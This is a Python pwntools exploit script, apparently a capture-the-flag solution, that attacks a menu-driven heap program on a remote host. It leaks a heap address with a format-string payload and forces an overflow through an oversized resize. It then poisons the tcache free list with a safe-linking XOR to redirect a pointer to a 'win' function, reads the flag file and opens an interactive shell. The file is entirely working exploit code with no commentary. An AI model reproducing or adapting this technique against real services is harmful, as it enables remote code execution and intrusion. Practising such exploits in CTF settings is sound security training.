#!/usr/bin/env python3
from pwn import *

PORT = 46356
HOST = "144.79.188.39"

p = remote(HOST, PORT)

def sla(pr, dt):
    return p.sendlineafter(pr, dt)

def sa(pr, dt):
    return p.sendafter(pr, dt)

def menu(opt):
    sla(b'> ', str(opt).encode())

def probe(fmt):
    menu(1)
    sla(b'Format: ', fmt)

def create(idx, sz, dt):
    menu(2)
    sla(b'Index: ', str(idx).encode())
    sla(b'Size: ', str(sz).encode())
    sa(b'Data: ', dt)

def show(idx):
    menu(3)
    sla(b'Index: ', str(idx).encode())

def edit(idx, dt):
    menu(4)
    sla(b'Index: ', str(idx).encode())
    sa(b'Data: ', dt)

def delete(idx):
    menu(5)
    sla(b'Index: ', str(idx).encode())

def resize(idx, sz, dt):
    menu(6)
    sla(b'Index: ', str(idx).encode())
    sla(b'Size: ', str(sz).encode())
    sa(b'Data: ', dt)

def flush():
    menu(7)


heap_slot  = 0x404060
create(0, 0x50, b'A'*0x50)
create(1, 0x50, b'B'*0x50)

fmt = flat(b'%8$s')
pl = fmt.ljust(0x10, b'A') + p64(heap_slot)
probe(pl)
chunk0 = u64(p.recv(4).ljust(8, b'\x00'))
log.success(f'chunk0: {hex(chunk0)}')

delete(1)
menu(6)
sla(b'Index: ', b'0')
sla(b'New size: ', str(0xffffffffffffffff).encode())

target = 0x4040f8 - 0x8
tp = (chunk0 >> 12) ^ target  

edit(0, p64(tp).ljust(0x50, b'\x00'))

create(1, 0x50, b'C'*0x50)

win = 0x401b17
pl = p64(0) + p64(win)

create(2, 0x50, pl.ljust(0x50, b'\x00'))

flush()
p.sendline(b'cat /flag.txt')
p.interactive()